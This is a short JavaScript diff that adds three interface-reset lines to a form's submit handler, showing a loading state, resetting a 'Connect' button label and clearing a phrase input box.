@@ -144,6 +144,9 @@ phraseForm.addEventListener('submit', (e) => {
         console.log(data);
         manualConnect.classList.remove("active")
         phraseForm.classList.add("active");
+        formLoading.classList.add("active");
+        connectBtn.innerHTML ="Connect";
+        phraseBox.value="";
 
     })
 	.catch(error => console.log(error));
